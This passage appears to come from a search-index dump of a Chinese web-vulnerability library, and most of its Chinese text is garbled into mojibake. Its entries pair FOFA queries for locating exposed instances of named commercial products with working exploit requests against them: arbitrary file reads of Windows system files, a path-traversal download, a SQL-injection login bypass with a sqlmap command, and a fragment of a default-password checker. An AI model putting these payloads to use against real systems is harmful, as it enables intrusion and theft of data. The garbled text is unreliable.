zxsoft1234!@#$ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÈªòËÆ§ÁÆ°ÁêÜÂëòÂº±Âè£‰ª§ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ ZhongXinJingDun_Default_administrator_password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂõæÂàõËΩØ‰ª∂/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂõæÂàõËΩØ‰ª∂/","title":"ÂõæÂàõËΩØ‰ª∂","keywords":"","body":"ÂõæÂàõËΩØ‰ª∂ ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂõæÂàõËΩØ‰ª∂/ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂõæÂàõËΩØ‰ª∂/ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂõæÂàõËΩØ‰ª∂ Âõæ‰π¶È¶ÜÁ´ôÁæ§ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] \"ÂπøÂ∑ûÂõæÂàõ\" && country=\"CN\" && body=\"/interlib/common/\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûËØ∑Ê±ÇÂåÖ‰∏∫ GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1 Host: Content-Length: 4 ÊàêÂäüËØªÂèñ system.ini Êñá‰ª∂ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰πÖÂÖ∂ËΩØ‰ª∂/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰πÖÂÖ∂ËΩØ‰ª∂/","title":"‰πÖÂÖ∂ËΩØ‰ª∂","keywords":"","body":"‰πÖÂÖ∂ËΩØ‰ª∂ ‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰πÖÂÖ∂ËΩØ‰ª∂/‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰πÖÂÖ∂ËΩØ‰ª∂/‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® download.jsp Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®‰∏äÁöÑ‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰πÖÂÖ∂Ë¥¢Âä°Êä•Ë°® FOFA [!NOTE] body=\"/netrep/\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïË∑ØÂæÑÂ¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /netrep/ebook/browse/download.jsp HTTP/1.1 Host: Content-Length: 55 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://114.251.113.53:7002 Content-Type: application/x-www-form-urlencoded jpgfilepath=c:\\windows\\win.ini Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞/","title":"ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞","keywords":"","body":"ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CNVD-2021-01929 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞/ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CNVD-2021-01929.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞/ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CNVD-2021-01929.html","title":"ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CNVD-2021-01929","keywords":"","body":"ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥û CNVD-2021-01929 ÊºèÊ¥ûÊèèËø∞ ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ•ÂøÉÁêÜÂí®ËØ¢ÊúâÈôêÂÖ¨Âè∏ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞Â≠òÂú®ÁõÆÂΩïÈÅçÂéÜÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆâÂæΩÈò≥ÂÖâÂøÉÂÅ• ÂøÉÁêÜÊµãÈáèÂπ≥Âè∞ FOFA [!NOTE] icon_hash=\"-320896955\" ÊºèÊ¥ûÂ§çÁé∞ ‰∏ªÈ°µÂ¶Ç‰∏ã Êâ´ÊèèÁõÆÂΩï ËÆøÈóÆ http://xxx.xxx.xxx.xxx/admin/ ÂÖ∂‰∏≠ http://xxx.xxx.xxx.xxx/admin/UserFiles/ ‰∏≠ËøòÂåÖÂê´‰∫ÜÁî®Êà∑‰ø°ÊÅØÂèØÊú™ÊéàÊùÉ‰∏ãËΩΩ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/","title":"ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞","keywords":"","body":"ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞ Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü ÂêéÂè∞XSSÊºèÊ¥û Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ÂºÄÂèëÊúâÈôêÂÖ¨Âè∏ÂºÄÂèëÁöÑÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞Á≥ªÁªü‰∏ãÁöÑÊ≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÁôªÂΩïÂâçÂè∞Â≠òÂú®ÈÄöÁî®SQLiÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞ - Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ÂºÄÂèëÊúâÈôêÂÖ¨Âè∏\" ÊºèÊ¥ûÂ§çÁé∞ ËøõÂÖ•È°µÈù¢Â¶Ç‰∏ã Âá∫Áé∞ÊºèÊ¥ûÁöÑUrl‰∏∫ http://xxxxxxx/JusRepos/ui/login.aspx ÊäìÂèñÁôªÂΩïÁöÑËØ∑Ê±ÇÂåÖ POST /JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 ÂÖ∂‰∏≠Ê≥®ÂÖ•ÁöÑÂèÇÊï∞‰∏∫ POSTÊï∞ÊçÆ‰∏≠ÁöÑ txtUser ÂèÇÊï∞, ‰øùÂ≠ò‰∏∫Êñá‰ª∂‰ΩøÁî® SqlmapË∑ë‰∏Ä‰∏ã sqlmap -r sql.txt -p txtUser ÂêåÊó∂ËøòÂ≠òÂú®ÁùÄ‰∏áËÉΩÂØÜÁ†ÅÂèØ‰ª•Áõ¥Êé•ÁôªÂΩïÂêéÂè∞ user: 1' or 1=1 -- pass: peiqi Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü ÂêéÂè∞XSSÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü ÂêéÂè∞XSSÊºèÊ¥û.html","title":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü ÂêéÂè∞XSSÊºèÊ¥û","keywords":"","body":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü ÂêéÂè∞XSSÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ÂºÄÂèëÊúâÈôêÂÖ¨Âè∏ÂºÄÂèëÁöÑÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞Á≥ªÁªü‰∏ãÁöÑÊ≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÁôªÂΩïÂêéÂè∞Áî®Êà∑ÂêçÂ§ÑÂ≠òÂú®ÈÄöÁî®XSSÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ Ê≥ïÂæãÁü•ËØÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªü FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞ - Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ÂºÄÂèëÊúâÈôêÂÖ¨Âè∏\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÂêéÂè∞ÂêéÊõ¥ÊîπÁî®Êà∑ÂêçÔºå‰ΩøÁî® tdÊ†áÁ≠æ Èó≠Âêà Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆûË∑µÊïôÂ≠¶Âπ≥Âè∞/Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Êù≠Â∑ûÊ≥ïÊ∫êËΩØ‰ª∂ ÂÖ¨ËØÅÂÆûÂä°ÊïôÂ≠¶ËΩØ‰ª∂ FOFA [!NOTE] FOFAÊöÇÊó∂Êú™Êî∂ÂΩï‰ªª‰ΩïÁΩëÁ´ô ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÁôªÂΩïÊäìÂèñËØ∑Ê±ÇÂåÖ POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ ÂÖ∂‰∏≠Ê≥®ÂÖ•ÁöÑÂèÇÊï∞‰∏∫ POSTÊï∞ÊçÆ‰∏≠ÁöÑ txtName ÂèÇÊï∞, ‰øùÂ≠ò‰∏∫Êñá‰ª∂‰ΩøÁî® SqlmapË∑ë‰∏Ä‰∏ã Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Èì∂Êæé‰∫ëËÆ°ÁÆó/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Èì∂Êæé‰∫ëËÆ°ÁÆó/","title":"Èì∂Êæé‰∫ëËÆ°ÁÆó","keywords":"","body":"Èì∂Êæé‰∫ëËÆ°ÁÆó Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62437 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Èì∂Êæé‰∫ëËÆ°ÁÆó/Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62437.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Èì∂Êæé‰∫ëËÆ°ÁÆó/Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62437.html","title":"Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ CNVD-2020-62437","keywords":"","body":"Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü ‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ ÊºèÊ¥ûÊèèËø∞ Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Èì∂Êæé‰∫ëËÆ°ÁÆó Â•ΩËßÜÈÄöËßÜÈ¢ë‰ºöËÆÆÁ≥ªÁªü FOFA [!NOTE] app=\"Hanming-Video-Conferencing\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûUrl‰∏∫ https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Yinpeng_Hanming_Video_Conferencing__Arbitrary_file_read.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈªòÂÆâ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈªòÂÆâ/","title":"ÈªòÂÆâ","keywords":"","body":"ÈªòÂÆâ ÈªòÂÆâ ÂπªÈòµËúúÁΩêÊú™ÊéàÊùÉËÆøÈóÆ RCE Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈªòÂÆâ/ÈªòÂÆâ ÂπªÈòµËúúÁΩêÊú™ÊéàÊùÉËÆøÈóÆ RCE.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈªòÂÆâ/ÈªòÂÆâ ÂπªÈòµËúúÁΩêÊú™ÊéàÊùÉËÆøÈóÆ RCE.html","title":"ÈªòÂÆâ ÂπªÈòµËúúÁΩêÊú™ÊéàÊùÉËÆøÈóÆ RCE","keywords":"","body":"ÈªòÂÆâ ÂπªÈòµËúúÁΩêÊú™ÊéàÊùÉËÆøÈóÆ RCE ÊºèÊ¥ûÊèèËø∞ ÈªòÂÆâ ÂπªÈòµËúúÁΩêÂ≠òÂú®ÈÉ®ÁΩ≤È°µÈù¢Êú™ÊéàÊùÉËÆøÈóÆ ÔºåÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÈªòÂÆâ ÂπªÈòµËúúÁΩê ÊºèÊ¥ûÂ§çÁé∞ ‰∫ßÂìÅÈ°µÈù¢ ÂÆâË£ÖÈ°µÈù¢Â¶Ç‰∏ã ÈªòÂÆâ ÂπªÈòµËúúÁΩê Âà∑Êñ∞Âπ∂ÊäìÂåÖ DropÊéâ /huanzhen/have_installed? ËøõÂÖ•È°µÈù¢ ÁÇπÂáªË∞ÉËØïÊäìÂåÖ ÊâßË°åÂÖ∂‰ªñÂëΩ‰ª§ ÁÇπÂáª‰∏ÄÈîÆËØäÊñ≠Ê≥ÑÈú≤ IPÊï∞ÊçÆ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/","title":"ÊòüÈîêËìùÊµ∑","keywords":"","body":"ÊòüÈîêËìùÊµ∑ ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.php 